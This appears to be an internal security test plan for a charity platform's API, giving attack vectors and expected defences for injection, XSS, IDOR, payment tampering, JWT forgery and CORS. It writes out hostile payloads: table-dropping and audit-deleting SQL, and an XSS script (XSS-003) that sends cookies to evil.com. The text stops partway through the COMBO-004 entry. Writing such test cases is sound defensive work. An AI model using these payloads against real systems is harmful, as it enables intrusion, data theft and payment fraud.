# Security Test Scenarios

## Tonghua Public Welfare x Sustainable Fashion

**Version:** 1.0.0
**Last Updated:** 2026-03-19
**Classification:** Internal -- Security Team
**Compliance:** PIPL, GDPR, 《未成年人保护法》

---

## Table of Contents

1. [Overview](#1-overview)
2. [SQL Injection Test Cases](#2-sql-injection-test-cases)
3. [XSS Attack Vectors](#3-xss-attack-vectors)
4. [IDOR Tests](#4-idor-tests)
5. [Payment Amount Tampering Tests](#5-payment-amount-tampering-tests)
6. [Child Data Exposure Tests](#6-child-data-exposure-tests)
7. [Rate Limit Bypass Tests](#7-rate-limit-bypass-tests)
8. [JWT Token Manipulation Tests](#8-jwt-token-manipulation-tests)
9. [CORS Violation Tests](#9-cors-violation-tests)
10. [Combined Attack Scenarios](#10-combined-attack-scenarios)

---

## 1. Overview

### Purpose

This document defines security test scenarios for the Tonghua Public Welfare platform. Every scenario includes a unique ID, severity level, affected endpoint, attack vector, expected behavior, and pass/fail criteria.

### Severity Levels

| Level | Code | Meaning |
|-------|------|---------|
| Critical | `P0` | Data breach, payment fraud, child data exposure |
| High | `P1` | Authentication bypass, privilege escalation |
| Medium | `P2` | Rate limit bypass, information disclosure |
| Low | `P3` | Minor information leakage, header misconfiguration |

### Test Environment

- **Base URL:** `https://api.tonghua.org/api/v1`
- **Staging URL:** `https://staging-api.tonghua.org/api/v1`
- **Auth:** JWT RS256 (access 15min, refresh 7d)
- **Rate Limits:** 1000 QPS global, 60 QPM per user
- **Encryption:** AES-256-GCM for child data, TLS 1.3 transport

---

## 2. SQL Injection Test Cases

### SQL-001: Login Email Field Injection

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /auth/login`
- **Description:** Attempt SQL injection via the email field to bypass authentication.
- **Attack Vector:**
  ```json
  {
    "email": "' OR '1'='1' --",
    "password": "anything"
  }
  ```
- **Expected Behavior:** Returns `401 Unauthorized` or `400 Bad Request`. The email parameter must be parameterized -- no SQL execution occurs.
- **Pass Criteria:** Response status is NOT `200`. No tokens returned. No database error message leaked.
- **Variations:**
  - `admin'--`
  - `' UNION SELECT id, email, password_hash FROM users --`
  - `" OR ""="`
  - `'; DROP TABLE users; --`

### SQL-002: Artwork Query Parameter Injection

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /artworks?campaign_id={input}`
- **Description:** Inject SQL via the `campaign_id` query parameter.
- **Attack Vector:**
  ```
  GET /artworks?campaign_id=1' UNION SELECT * FROM child_participants --
  ```
- **Expected Behavior:** Returns `400 Bad Request` with validation error. No child_participants data leaked.
- **Pass Criteria:** Response does not contain any child_participants table data. Validation error is generic (no SQL syntax in error message).

### SQL-003: Product Search Injection

- **Severity:** P1 -- High
- **Endpoint:** `GET /products?category={input}`
- **Description:** Inject SQL via the `category` filter.
- **Attack Vector:**
  ```
  GET /products?category=bags' AND (SELECT SLEEP(5)) --
  ```
- **Expected Behavior:** Returns quickly (no time-based SQL injection). Response within 500ms.
- **Pass Criteria:** Response time < 500ms. Status is `400` or returns valid products with no side effects.

### SQL-004: Donation Amount Field Injection

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /donations/initiate`
- **Description:** Attempt SQL injection in the amount field.
- **Attack Vector:**
  ```json
  {
    "amount": "100; UPDATE donations SET status='completed' WHERE 1=1 --",
    "currency": "CNY",
    "payment_provider": "stripe"
  }
  ```
- **Expected Behavior:** Returns `400 Bad Request` (type validation fails -- amount must be a number).
- **Pass Criteria:** No SQL executed. No donations modified. Error message is type-validation only.

### SQL-005: Order ID Path Parameter Injection

- **Severity:** P1 -- High
- **Endpoint:** `GET /orders/{id}`
- **Description:** Inject SQL via the order ID path parameter.
- **Attack Vector:**
  ```
  GET /orders/1' OR '1'='1
  ```
- **Expected Behavior:** Returns `404 Not Found` or `400 Bad Request` (UUID validation fails).
- **Pass Criteria:** UUID format validation rejects the input before any database query.

### SQL-006: Campaign Title Injection (Stored)

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /admin/campaigns` (admin only)
- **Description:** Attempt stored SQL injection via campaign title.
- **Attack Vector:**
  ```json
  {
    "title": "Test'; INSERT INTO users (role) VALUES ('super_admin'); --",
    "theme": "test",
    "description": "test",
    "start_date": "2026-04-01",
    "end_date": "2026-06-01"
  }
  ```
- **Expected Behavior:** Input sanitization strips or rejects the SQL fragment. Campaign title stored as literal string.
- **Pass Criteria:** No new admin user created. Campaign title stored safely. No SQL error in response.

### SQL-007: Batch Injection via JSON Array

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /admin/analytics` (query parameters)
- **Description:** Inject via complex JSON body in admin analytics filters.
- **Attack Vector:**
  ```json
  {
    "date_range": {
      "start": "2026-01-01'; DELETE FROM audit_log; --",
      "end": "2026-12-31"
    }
  }
  ```
- **Expected Behavior:** Date validation rejects non-date formats. Returns `400`.
- **Pass Criteria:** Audit log intact. No data deleted.

---

## 3. XSS Attack Vectors

### XSS-001: Reflected XSS in Artwork Title

- **Severity:** P1 -- High
- **Endpoint:** `POST /artworks` (creates content that is later displayed)
- **Description:** Inject script tags via the artwork title field.
- **Attack Vector:**
  ```json
  {
    "title": "<script>alert('XSS')</script>",
    "campaign_id": "valid-uuid",
    "child_display_name": "Test Child",
    "guardian_consent": true
  }
  ```
- **Expected Behavior:** Title is sanitized or HTML-encoded when stored. When retrieved via `GET /artworks`, the script tag appears as escaped text `&lt;script&gt;`.
- **Pass Criteria:**
  - Response from `GET /artworks` does not contain unescaped `<script>` tags.
  - Content-Security-Policy header prevents inline script execution.
  - `Content-Type` is `application/json` (not `text/html`).

### XSS-002: Stored XSS in Donation Message

- **Severity:** P1 -- High
- **Endpoint:** `POST /donations/initiate`
- **Description:** Inject XSS payload in the donation message field.
- **Attack Vector:**
  ```json
  {
    "amount": 50.00,
    "currency": "CNY",
    "message": "<img src=x onerror=alert(document.cookie)>",
    "payment_provider": "stripe"
  }
  ```
- **Expected Behavior:** Message is sanitized. When donation detail is retrieved, the payload is neutralized.
- **Pass Criteria:** `GET /donations/{id}` returns the message with HTML entities encoded.

### XSS-003: DOM-Based XSS via Campaign Description

- **Severity:** P1 -- High
- **Endpoint:** `POST /admin/campaigns`
- **Description:** Inject SVG-based XSS in campaign description.
- **Attack Vector:**
  ```json
  {
    "title": "Safe Title",
    "theme": "test",
    "description": "<svg onload=alert(1)><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "start_date": "2026-04-01",
    "end_date": "2026-06-01"
  }
  ```
- **Expected Behavior:** Description is sanitized on input. SVG and script tags stripped or encoded.
- **Pass Criteria:** Retrieved campaign description contains no executable HTML.

### XSS-004: JSON Injection in Error Responses

- **Severity:** P2 -- Medium
- **Endpoint:** `POST /auth/login`
- **Description:** Attempt to inject HTML/JS into JSON error responses.
- **Attack Vector:**
  ```json
  {
    "email": "<script>alert('xss')</script>",
    "password": "test"
  }
  ```
- **Expected Behavior:** Error response body is pure JSON. No HTML rendering. Content-Type is `application/json`.
- **Pass Criteria:**
  - Response `Content-Type: application/json` (not `text/html`).
  - Response body contains no unescaped HTML.
  - `X-Content-Type-Options: nosniff` header present.

### XSS-005: Template Injection (SSTI)

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /artworks` (description field)
- **Description:** Attempt server-side template injection.
- **Attack Vector:**
  ```json
  {
    "title": "Test Artwork",
    "campaign_id": "valid-uuid",
    "child_display_name": "Test",
    "description": "{{constructor.constructor('alert(1)')()}}",
    "guardian_consent": true
  }
  ```
- **Expected Behavior:** Description stored as literal string. No template evaluation.
- **Pass Criteria:** No JavaScript execution. Description stored and retrieved literally.

### XSS-006: Header Injection

- **Severity:** P2 -- Medium
- **Endpoint:** Any endpoint
- **Description:** Inject CRLF characters via headers to manipulate HTTP response.
- **Attack Vector:**
  ```
  X-Custom-Header: value\r\nSet-Cookie: admin=true
  ```
- **Expected Behavior:** Custom headers rejected or sanitized. CRLF characters stripped.
- **Pass Criteria:** No additional Set-Cookie header in response. CRLF characters not reflected.

---

## 4. IDOR Tests

### IDOR-001: Access Another User's Order

- **Severity:** P1 -- High
- **Endpoint:** `GET /orders/{order_id}`
- **Description:** User A tries to access User B's order by guessing or enumerating order IDs.
- **Attack Vector:**
  ```
  User A has order: /orders/aaaa-1111
  User A requests:  /orders/bbbb-2222 (User B's order)
  ```
- **Expected Behavior:** Returns `403 Forbidden` or `404 Not Found`. The server must verify that the authenticated user owns the requested order.
- **Pass Criteria:** Response status is NOT `200`. No order details leaked.

### IDOR-002: Access Another User's Donation

- **Severity:** P1 -- High
- **Endpoint:** `GET /donations/{donation_id}`
- **Description:** User tries to access a donation record they did not create.
- **Attack Vector:**
  ```
  GET /donations/{other_user_donation_id}
  Authorization: Bearer {user_a_token}
  ```
- **Expected Behavior:** Returns `403` or `404`.
- **Pass Criteria:** No donation data returned. No error message revealing the donation exists.

### IDOR-003: Access Child Data Without Authorization

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /admin/child-participants/{child_id}`
- **Description:** Regular authenticated user attempts to access child participant records.
- **Attack Vector:**
  ```
  GET /admin/child-participants/some-child-id
  Authorization: Bearer {regular_user_token}
  ```
- **Expected Behavior:** Returns `403 Forbidden`. Child data requires `compliance_officer` or `super_admin` role.
- **Pass Criteria:** Response is `403`. No child data returned.

### IDOR-004: Modify Another User's Artwork

- **Severity:** P1 -- High
- **Endpoint:** `PUT /artworks/{id}` or `PATCH /artworks/{id}`
- **Description:** User A attempts to modify User B's artwork.
- **Attack Vector:**
  ```
  PATCH /artworks/{user_b_artwork_id}
  Authorization: Bearer {user_a_token}
  Body: {"title": "Hijacked Title"}
  ```
- **Expected Behavior:** Returns `403 Forbidden`. Only the artwork owner or admin can modify.
- **Pass Criteria:** Artwork title unchanged. `403` returned.

### IDOR-005: Enumerate User IDs

- **Severity:** P2 -- Medium
- **Endpoint:** `GET /orders/{id}` with sequential UUIDs
- **Description:** Attacker iterates through UUIDs to discover valid resource IDs.
- **Attack Vector:**
  ```python
  # Automated enumeration
  for i in range(1000):
      response = requests.get(f"/orders/{generate_uuid(i)}")
  ```
- **Expected Behavior:** Rate limiting kicks in after 60 requests per minute. All responses return `403` or `404` for non-owned resources.
- **Pass Criteria:** Rate limit enforced. No valid resource data returned for other users' resources.

### IDOR-006: Direct Object Reference in Admin Endpoints

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /admin/analytics?user_id={target_user_id}`
- **Description:** Admin endpoint allows filtering by arbitrary user ID without proper authorization.
- **Attack Vector:**
  ```
  GET /admin/analytics?user_id={other_user_id}
  Authorization: Bearer {admin_token}
  ```
- **Expected Behavior:** Admin can access analytics but should not be able to query individual user data through this endpoint. Returns aggregated data only.
- **Pass Criteria:** No individual user PII in response. Only aggregated metrics.

---

## 5. Payment Amount Tampering Tests

### PAY-001: Negative Donation Amount

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /donations/initiate`
- **Description:** Submit a negative amount to potentially receive a refund or manipulate fund tracking.
- **Attack Vector:**
  ```json
  {
    "amount": -100.00,
    "currency": "CNY",
    "payment_provider": "stripe"
  }
  ```
- **Expected Behavior:** Returns `400 Bad Request`. Amount must be a positive decimal greater than minimum (e.g., 1.00).
- **Pass Criteria:** Validation rejects negative amounts. No payment intent created.

### PAY-002: Zero Amount Donation

- **Severity:** P1 -- High
- **Endpoint:** `POST /donations/initiate`
- **Description:** Submit zero amount.
- **Attack Vector:**
  ```json
  {
    "amount": 0.00,
    "currency": "CNY",
    "payment_provider": "stripe"
  }
  ```
- **Expected Behavior:** Returns `400 Bad Request`.
- **Pass Criteria:** Zero amounts rejected. Minimum amount enforced.

### PAY-003: Order Amount Mismatch (Client-Side Tampering)

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /payments/create`
- **Description:** Client sends a different amount than what the server calculated for the order.
- **Attack Vector:**
  ```json
  {
    "order_id": "valid-order-id",
    "order_type": "product",
    "provider": "wechat_pay",
    "amount": 0.01,
    "currency": "CNY"
  }
  ```
  Where the server-calculated order total is 256.00.
- **Expected Behavior:** Server ignores client-provided `amount` and uses the server-calculated order total. Payment intent created for the correct amount (256.00).
- **Pass Criteria:** Payment intent amount matches the server-calculated order total, NOT the client-provided amount.

### PAY-004: Currency Mismatch

- **Severity:** P1 -- High
- **Endpoint:** `POST /payments/create`
- **Description:** Submit payment with a different currency than the order.
- **Attack Vector:**
  ```json
  {
    "order_id": "valid-order-id",
    "order_type": "product",
    "provider": "stripe",
    "amount": 256.00,
    "currency": "JPY"
  }
  ```
  Where the order was created in CNY.
- **Expected Behavior:** Server uses the order's original currency. Currency mismatch is rejected or overridden.
- **Pass Criteria:** Payment currency matches order currency. JPY attempt rejected.

### PAY-005: Replay Payment Webhook

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /payments/webhook`
- **Description:** Attacker replays a legitimate payment webhook to mark an unpaid order as completed.
- **Attack Vector:**
  ```
  POST /payments/webhook
  Body: { "event": "payment.completed", "payment_id": "valid-id", "signature": "old-valid-signature" }
  ```
- **Expected Behavior:** Webhook signature includes a timestamp. Stale webhooks (>5 minutes old) are rejected. Idempotency check prevents duplicate processing.
- **Pass Criteria:** Duplicate webhook returns `200` (acknowledged) but does NOT re-process the payment. Order status unchanged.

### PAY-006: Float Precision Exploit

- **Severity:** P2 -- Medium
- **Endpoint:** `POST /orders`
- **Description:** Submit quantities or prices with excessive decimal places to exploit float rounding.
- **Attack Vector:**
  ```json
  {
    "product_id": "valid-id",
    "quantity": 1.0000000001,
    "shipping_address": {...},
    "payment_provider": "wechat_pay"
  }
  ```
- **Expected Behavior:** Quantity must be a positive integer. Returns `400` for non-integer quantities.
- **Pass Criteria:** Non-integer quantities rejected. Server-side calculation uses integer arithmetic for quantities.

### PAY-007: Excessive Decimal Precision in Amount

- **Severity:** P2 -- Medium
- **Endpoint:** `POST /donations/initiate`
- **Description:** Submit amount with many decimal places.
- **Attack Vector:**
  ```json
  {
    "amount": 100.001,
    "currency": "CNY",
    "payment_provider": "stripe"
  }
  ```
- **Expected Behavior:** Amount rounded to 2 decimal places: 100.00. Or returns `400` for invalid precision.
- **Pass Criteria:** Amount validated to maximum 2 decimal places.

---

## 6. Child Data Exposure Tests

### CHILD-001: Unauthorized Child Data Access

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /admin/child-participants/{id}`
- **Description:** Regular user attempts to access encrypted child participant data.
- **Attack Vector:**
  ```
  GET /admin/child-participants/{child_id}
  Authorization: Bearer {regular_user_token}
  ```
- **Expected Behavior:** Returns `403 Forbidden`. Child data is in an isolated database schema accessible only to compliance officers and super admins.
- **Pass Criteria:**
  - Response is `403`.
  - No child data in response body.
  - Access attempt logged in `audit_log` table.

### CHILD-002: Child Data in Public API Responses

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /artworks/{id}`
- **Description:** Verify that artwork detail endpoint does not leak child real names, school names, or other PII.
- **Attack Vector:**
  ```
  GET /artworks/{artwork_of_child_participant}
  ```
- **Expected Behavior:** Response contains only `display_name` (e.g., "Little Star"). No real name, school, ID card, or parent phone number.
- **Pass Criteria:**
  - Response JSON does NOT contain fields: `real_name`, `school`, `id_card`, `parent_phone`, `parent_email`.
  - Only `display_name` field present.
  - `display_name` is a pseudonym, not the child's real name.

### CHILD-003: Child Data in Artwork List

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /artworks`
- **Description:** Verify that the artwork list endpoint does not expose child PII in bulk.
- **Attack Vector:**
  ```
  GET /artworks?per_page=100
  ```
- **Expected Behavior:** Each artwork item contains only `display_name`. No child PII anywhere in the list.
- **Pass Criteria:** Bulk extraction of 100 artworks reveals zero child PII beyond display names.

### CHILD-004: Child Data via SQL Injection

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /artworks?campaign_id={injection}`
- **Description:** Attempt to join against child_participants table via SQL injection.
- **Attack Vector:**
  ```
  GET /artworks?campaign_id=' UNION SELECT * FROM child_participants --
  ```
- **Expected Behavior:** SQL injection blocked. Returns `400`.
- **Pass Criteria:** No child_participants data in response. SQL injection prevented.

### CHILD-005: Child Data via IDOR on Admin Endpoint

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /admin/child-participants/{id}`
- **Description:** Compliance officer accesses child data they are not assigned to review.
- **Attack Vector:**
  ```
  GET /admin/child-participants/{unassigned_child_id}
  Authorization: Bearer {compliance_officer_token}
  ```
- **Expected Behavior:** Even compliance officers should only access child data within their assigned scope. Returns `403` if child is outside their assignment.
- **Pass Criteria:** Access denied for unassigned child records. All access logged.

### CHILD-006: Guardian Consent Bypass

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /artworks`
- **Description:** Submit artwork for a child without valid guardian consent.
- **Attack Vector:**
  ```json
  {
    "title": "Test",
    "campaign_id": "valid-id",
    "child_display_name": "Child",
    "guardian_consent": false
  }
  ```
- **Expected Behavior:** Returns `403 Forbidden`. Artwork not created. Guardian consent is mandatory for child participants.
- **Pass Criteria:** Artwork NOT created. Response is `403` with message about consent requirement.

### CHILD-007: Child Data Export Restriction

- **Severity:** P0 -- Critical
- **Endpoint:** `GET /admin/analytics?export=csv`
- **Description:** Attempt to export analytics data that might include child information.
- **Attack Vector:**
  ```
  GET /admin/analytics?export=csv&include_children=true
  ```
- **Expected Behavior:** Export does not include child PII even if requested. `include_children` parameter is ignored or returns `400`.
- **Pass Criteria:** CSV export contains no child real names, schools, ID cards, or parent contact info.

---

## 7. Rate Limit Bypass Tests

### RATE-001: Global Rate Limit Enforcement

- **Severity:** P1 -- High
- **Endpoint:** Any endpoint
- **Description:** Exceed the global rate limit of 1000 QPS.
- **Attack Vector:**
  ```python
  import asyncio, httpx

  async def spam():
      async with httpx.AsyncClient() as client:
          tasks = [client.get("https://api.tonghua.org/api/v1/artworks") for _ in range(1500)]
          responses = await asyncio.gather(*tasks, return_exceptions=True)
          return [r.status_code for r in responses if hasattr(r, 'status_code')]

  # Sends 1500 concurrent requests
  ```
- **Expected Behavior:** After ~1000 requests, responses include `429 Too Many Requests`. `Retry-After` header present.
- **Pass Criteria:**
  - At least some responses are `429`.
  - `Retry-After` header present in 429 responses.
  - `X-RateLimit-Limit` and `X-RateLimit-Remaining` headers present in all responses.

### RATE-002: Per-User Rate Limit (60 QPM)

- **Severity:** P1 -- High
- **Endpoint:** `POST /donations/initiate` (authenticated)
- **Description:** Single authenticated user exceeds 60 requests per minute.
- **Attack Vector:**
  ```python
  for i in range(100):
      response = client.post("/donations/initiate", json=payload, headers=auth_headers)
  ```
- **Expected Behavior:** After 60 requests within 1 minute, returns `429`.
- **Pass Criteria:** 61st request within the same minute returns `429`.

### RATE-003: Rate Limit Bypass via IP Rotation

- **Severity:** P1 -- High
- **Endpoint:** Any endpoint
- **Description:** Attacker rotates IP addresses to bypass per-IP rate limiting.
- **Attack Vector:**
  ```
  Request 1: X-Forwarded-For: 1.2.3.4
  Request 2: X-Forwarded-For: 5.6.7.8
  Request 3: X-Forwarded-For: 9.10.11.12
  ```
- **Expected Behavior:** Server uses the actual connection IP, NOT the `X-Forwarded-For` header, for rate limiting. The proxy/load balancer strips or validates this header.
- **Pass Criteria:** Rate limit enforced on actual source IP. `X-Forwarded-For` header manipulation does not bypass limits.

### RATE-004: Rate Limit Bypass via Token Rotation

- **Severity:** P1 -- High
- **Endpoint:** `POST /auth/login` then authenticated endpoints
- **Description:** Attacker obtains multiple tokens to distribute requests across user identities.
- **Attack Vector:**
  ```python
  # Login with 10 different accounts
  tokens = [login(f"user{i}@example.com") for i in range(10)]
  # Send 59 requests per account (590 total) within 1 minute
  ```
- **Expected Behavior:** Per-user rate limit is 60 QPM, so this technically works within limits. However, global rate limit of 1000 QPS still applies. Additionally, suspicious patterns (multiple accounts from same IP) trigger rate limiting.
- **Pass Criteria:** Global rate limit still applies. Suspicious multi-account activity is flagged.

### RATE-005: Rate Limit Bypass via HTTP Method Change

- **Severity:** P2 -- Medium
- **Endpoint:** `/artworks`
- **Description:** Attacker sends GET and POST requests to the same path to bypass path-specific rate limits.
- **Attack Vector:**
  ```
  GET /artworks (counts toward limit)
  POST /artworks (separate counter?)
  GET /artworks?foo=bar (different query string = different counter?)
  ```
- **Expected Behavior:** Rate limit is applied per path (ignoring method and query string), or per-path-per-method with a shared global limit.
- **Pass Criteria:** Rate limit counter is shared across HTTP methods for the same base path.

### RATE-006: WebSocket or Long-Polling Bypass

- **Severity:** P2 -- Medium
- **Endpoint:** Any endpoint
- **Description:** Attacker holds connections open to exhaust server resources without triggering request-count rate limits.
- **Attack Vector:**
  ```
  Open 10,000 concurrent connections to /artworks with slow drip responses
  ```
- **Expected Behavior:** Connection timeout enforced (e.g., 30s). Maximum concurrent connections per IP limited.
- **Pass Criteria:** Connections timeout after 30s. Max connections per IP enforced.

---

## 8. JWT Token Manipulation Tests

### JWT-001: Expired Access Token

- **Severity:** P1 -- High
- **Endpoint:** Any authenticated endpoint
- **Description:** Use an expired access token (older than 15 minutes).
- **Attack Vector:**
  ```
  GET /orders
  Authorization: Bearer {expired_access_token}
  ```
- **Expected Behavior:** Returns `401 Unauthorized` with error code `TOKEN_EXPIRED`.
- **Pass Criteria:**
  - Response is `401`.
  - Error body includes `"code": "TOKEN_EXPIRED"`.
  - `WWW-Authenticate` header present.

### JWT-002: Algorithm Confusion (RS256 to HS256)

- **Severity:** P0 -- Critical
- **Endpoint:** Any authenticated endpoint
- **Description:** Attacker re-signs the JWT using HS256 with the public RSA key as the HMAC secret.
- **Attack Vector:**
  ```
  Original JWT header: {"alg": "RS256", "typ": "JWT"}
  Tampered JWT header: {"alg": "HS256", "typ": "JWT"}
  Signature: HMAC-SHA256(payload, public_rsa_key)
  ```
- **Expected Behavior:** Server rejects tokens with algorithm different from expected RS256. Server must explicitly specify the algorithm during verification, NOT read it from the token header.
- **Pass Criteria:** Token rejected. `401 Unauthorized` returned.

### JWT-003: Tampered Payload (Role Escalation)

- **Severity:** P0 -- Critical
- **Endpoint:** Any authenticated endpoint
- **Description:** Attacker modifies the JWT payload to escalate their role.
- **Attack Vector:**
  ```
  Original payload: {"sub": "user-id", "role": "registered", "exp": ...}
  Tampered payload: {"sub": "user-id", "role": "super_admin", "exp": ...}
  ```
  Re-sign with attacker's key (signature will be wrong).
- **Expected Behavior:** Signature verification fails. Token rejected.
- **Pass Criteria:** `401 Unauthorized`. Signature validation catches tampering.

### JWT-004: None Algorithm Attack

- **Severity:** P0 -- Critical
- **Endpoint:** Any authenticated endpoint
- **Description:** Attacker sets the algorithm to "none" and removes the signature.
- **Attack Vector:**
  ```
  Header: {"alg": "none", "typ": "JWT"}
  Payload: {"sub": "user-id", "role": "super_admin"}
  Signature: (empty)
  ```
- **Expected Behavior:** Server rejects tokens with "none" algorithm. Only RS256 accepted.
- **Pass Criteria:** Token rejected with `401`.

### JWT-005: Refresh Token Reuse After Logout

- **Severity:** P1 -- High
- **Endpoint:** `POST /auth/refresh`
- **Description:** After logging out, attacker tries to use the old refresh token.
- **Attack Vector:**
  ```
  1. Login -> receive access_token + refresh_token
  2. POST /auth/logout (invalidates tokens)
  3. POST /auth/refresh with old refresh_token
  ```
- **Expected Behavior:** Returns `401 Unauthorized`. Refresh token invalidated on logout.
- **Pass Criteria:** Refresh fails. No new tokens issued.

### JWT-006: Refresh Token Reuse Detection

- **Severity:** P0 -- Critical
- **Endpoint:** `POST /auth/refresh`
- **Description:** Attacker steals a refresh token and uses it after the legitimate user has already refreshed.
- **Attack Vector:**
  ```
  1. Legitimate user: POST /auth/refresh -> new refresh_token_2
  2. Attacker: POST /auth/refresh with old refresh_token_1
  ```
- **Expected Behavior:** Refresh token rotation: when a refresh token is reused (already consumed), ALL tokens for that user are invalidated (security incident response).
- **Pass Criteria:**
  - Attacker's request returns `401`.
  - Both old and new refresh tokens invalidated.
  - User must re-authenticate.
  - Security alert logged.

### JWT-007: Token from Different Issuer

- **Severity:** P1 -- High
- **Endpoint:** Any authenticated endpoint
- **Description:** Attacker provides a valid JWT from a different service/issuer.
- **Attack Vector:**
  ```
  Valid JWT from "other-service.com" with matching RS256 algorithm
  but different "iss" claim
  ```
- **Expected Behavior:** Server validates the `iss` (issuer) claim matches `https://api.tonghua.org`.
- **Pass Criteria:** Token rejected due to issuer mismatch.

### JWT-008: Kid Header Injection

- **Severity:** P0 -- Critical
- **Endpoint:** Any authenticated endpoint
- **Description:** Attacker injects SQL or path traversal via the `kid` (Key ID) header.
- **Attack Vector:**
  ```
  Header: {"alg": "RS256", "kid": "../../../dev/null"}
  ```
  Or:
  ```
  Header: {"alg": "RS256", "kid": "'; SELECT key FROM keys --"}
  ```
- **Expected Behavior:** `kid` value validated against an allowlist of known key IDs. Invalid `kid` values rejected immediately.
- **Pass Criteria:** Token rejected. No file system traversal. No SQL injection via kid.

---

## 9. CORS Violation Tests

### CORS-001: Unauthorized Origin

- **Severity:** P1 -- High
- **Endpoint:** Any API endpoint
- **Description:** Request from an unauthorized origin.
- **Attack Vector:**
  ```
  Origin: https://evil-site.com
  GET /api/v1/artworks
  ```
- **Expected Behavior:** Response does NOT include `Access-Control-Allow-Origin: https://evil-site.com`. CORS preflight fails.
- **Pass Criteria:**
  - `Access-Control-Allow-Origin` header is either absent or set to `null`.
  - Browser blocks the response.

### CORS-002: Wildcard CORS with Credentials

- **Severity:** P1 -- High
- **Endpoint:** Any API endpoint
- **Description:** Verify that `Access-Control-Allow-Origin: *` is NOT used with `Access-Control-Allow-Credentials: true`.
- **Attack Vector:**
  ```
  Origin: https://evil-site.com
  Cookie: session=legitimate-session
  GET /api/v1/orders
  ```
- **Expected Behavior:** If CORS allows credentials, the `Access-Control-Allow-Origin` must be a specific origin, NOT `*`.
- **Pass Criteria:**
  - No response with both `Access-Control-Allow-Origin: *` AND `Access-Control-Allow-Credentials: true`.
  - Specific origin whitelist enforced.

### CORS-003: Null Origin Bypass

- **Severity:** P1 -- High
- **Endpoint:** Any API endpoint
- **Description:** Attacker sends `Origin: null` to bypass CORS.
- **Attack Vector:**
  ```
  Origin: null
  GET /api/v1/artworks
  ```
- **Expected Behavior:** `Origin: null` is not in the allowed origins list. Response does not reflect `null` origin.
- **Pass Criteria:**
  - `Access-Control-Allow-Origin` is NOT `null`.
  - CORS preflight rejects null origin.

### CORS-004: Subdomain Wildcard Bypass

- **Severity:** P2 -- Medium
- **Endpoint:** Any API endpoint
- **Description:** Attacker controls a subdomain of an allowed domain.
- **Attack Vector:**
  ```
  Origin: https://evil.tonghua.org
  ```
  If CORS allows `*.tonghua.org`.
- **Expected Behavior:** CORS allows only specific subdomains: `www.tonghua.org`, `api.tonghua.org`. Not `*.tonghua.org`.
- **Pass Criteria:** `evil.tonghua.org` is NOT in the allowed origins. Only explicitly listed subdomains allowed.

### CORS-005: Preflight Method Bypass

- **Severity:** P1 -- High
- **Endpoint:** `DELETE /orders/{id}`
- **Description:** Attacker sends a preflight request for dangerous methods.
- **Attack Vector:**
  ```
  OPTIONS /api/v1/orders/{id}
  Origin: https://evil-site.com
  Access-Control-Request-Method: DELETE
  Access-Control-Request-Headers: Authorization
  ```
- **Expected Behavior:** Preflight response does NOT include `DELETE` in `Access-Control-Allow-Methods` for unauthorized origins.
- **Pass Criteria:**
  - Only `GET, POST, PUT, PATCH, OPTIONS` in allowed methods for public origins.
  - `DELETE` only allowed from trusted origins (admin dashboard).

### CORS-006: Header Allowlist Bypass

- **Severity:** P2 -- Medium
- **Endpoint:** Any API endpoint
- **Description:** Attacker sends custom headers not in the allowed list.
- **Attack Vector:**
  ```
  OPTIONS /api/v1/artworks
  Origin: https://evil-site.com
  Access-Control-Request-Headers: X-Custom-Admin-Header
  ```
- **Expected Behavior:** `Access-Control-Allow-Headers` only includes: `Content-Type`, `Authorization`, `X-Request-ID`, `X-HMAC-Signature`. Custom admin headers not included.
- **Pass Criteria:** Custom headers not reflected in preflight response. Request blocked by browser.

---

## 10. Combined Attack Scenarios

### COMBO-001: SQL Injection + IDOR to Extract Child Data

- **Severity:** P0 -- Critical
- **Description:** Attacker chains SQL injection with IDOR to access child_participants table.
- **Steps:**
  1. Inject SQL via `GET /artworks?campaign_id=' UNION SELECT id,null,null FROM child_participants --`
  2. Extract child IDs from error messages or timing differences
  3. Use extracted IDs in `GET /admin/child-participants/{extracted_id}`
- **Expected Defense in Depth:**
  1. SQL injection prevented at step 1 (parameterized queries)
  2. Even if SQL injection succeeds, child_participants in isolated schema (inaccessible from artwork queries)
  3. Admin endpoint requires `compliance_officer` role (step 3 blocked)
  4. Audit log captures all attempts
- **Pass Criteria:** Attack fails at any one of the 4 defense layers.

### COMBO-002: XSS + CSRF to Make Unauthorized Donation

- **Severity:** P0 -- Critical
- **Description:** Attacker injects XSS to steal session, then makes fraudulent donations.
- **Steps:**
  1. Inject XSS payload in artwork title (stored XSS)
  2. Admin views artwork, XSS executes, steals admin cookie
  3. Attacker uses stolen cookie to initiate donations
- **Expected Defense in Depth:**
  1. XSS prevented by input sanitization (step 1 fails)
  2. HttpOnly cookies prevent JavaScript access (step 2 cookie theft fails)
  3. JWT in Authorization header, not cookies (step 2 irrelevant)
  4. CSRF tokens required for state-changing operations (step 3 fails)
- **Pass Criteria:** Attack fails at any one of the 4 defense layers.

### COMBO-003: JWT Manipulation + Payment Tampering

- **Severity:** P0 -- Critical
- **Description:** Attacker tampers with JWT to escalate role, then manipulates payment amounts.
- **Steps:**
  1. Modify JWT payload to change role to `super_admin`
  2. Use tampered token to access admin endpoints
  3. Modify payment amounts in admin dashboard
- **Expected Defense in Depth:**
  1. JWT signature verification fails (step 1 detected)
  2. Even with valid admin token, payment amounts server-calculated (step 3 impossible)
  3. Payment webhook validates against payment provider (step 3 reversible)
- **Pass Criteria:** Attack fails at any one of the 3 defense layers.

### COMBO-004: Rate Limit Bypass + Brute Force Login

- **Severity:** P1 -- High
- **Description:** Attacker bypasses rate limits to brute-force login credentials.
- **Steps:**
